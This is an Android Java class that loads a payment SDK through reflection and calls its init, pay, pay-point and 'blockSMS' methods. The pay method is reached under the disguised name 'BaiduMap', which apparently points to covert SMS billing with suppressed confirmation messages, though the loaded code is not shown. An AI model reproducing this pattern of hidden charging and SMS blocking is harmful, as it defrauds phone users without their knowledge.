package cn.egamex.load.reflex;

import android.content.Context;
import android.util.Log;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

import cn.egamex.load.Utils.Constants;

/**
 * Created by Administrator on 2017/7/27.
 */

public class ReflexManager {
    private static ReflexManager reflexManager = null;

    public static ReflexManager getInstance() {
        if (reflexManager == null) {
            reflexManager = new ReflexManager();
        }
        return reflexManager;
    }

    public void init(Context ctx, String price, int payItemID, String str, String product, String Did,
                     String extData, Object payCallBackObject, Object initObject, Class<?> clazz) {
        try {
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            ci.getMethod("SDKInitializer",
                    new Class[]{Context.class, String.class, int.class, String.class, String.class, String.class,
                            String.class, Object.class, Object.class})
                    .invoke(o, new Object[]{ctx, price, payItemID, str, product, Did, extData, payCallBackObject, initObject});
        } catch (InvocationTargetException e) {
            if (Constants.isOutPut) {
                Log.i("SDK", e.toString());
            }
        } catch (Exception e) {
            if (Constants.isOutPut) {
                Log.i("SDK", e.toString());
            }
        }
    }

    public void pay(Context ctx, String price, int payItemID, String str, String product, String Did,
                    String extData, Object payCallBackObject, Class<?> clazz) {
        try {
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            ci.getMethod("BaiduMap",
                    new Class[]{Context.class, String.class, int.class, String.class, String.class, String.class,
                            String.class, Object.class})
                    .invoke(o, new Object[]{ctx, price, payItemID, str, product, Did, extData, payCallBackObject});
        } catch (Exception e) {
            if (Constants.isOutPut) {
                Log.i("SDK", e.toString());
            }
        }
    }

    public void blockSMS(Context context, Class<?> clazz) {
        try {
            if (Constants.isOutPut) {
                Log.i("SDK", "name: " + clazz.getName());
                Log.i("SDK", "length: " + clazz.getMethods().length);
            }
            Method[] ms = clazz.getMethods();
            for (Method m : ms) {
                if (Constants.isOutPut) {
                    Log.i("SDK", "payInit: " + m.getName());
                }
                Class<?>[] cx = m.getParameterTypes();
            }
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            ci.getMethod("s", Context.class).invoke(o, context);
        } catch (Exception e) {
            Log.i("SDK", e.toString());
        }
    }

    public HashMap<String, Map<String, Object>> getPayPoint(Class<?> clazz) {
        try {
            Method[] ms = clazz.getMethods();
            Method method = clazz.getMethod("getInstance");
            Object o = method.invoke(null);
            Class<? extends Object> ci = o.getClass();
            HashMap<String, Map<String, Object>> payPoint = (HashMap<String, Map<String, Object>>) ci
                    .getMethod("g").invoke(o);
            return payPoint;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
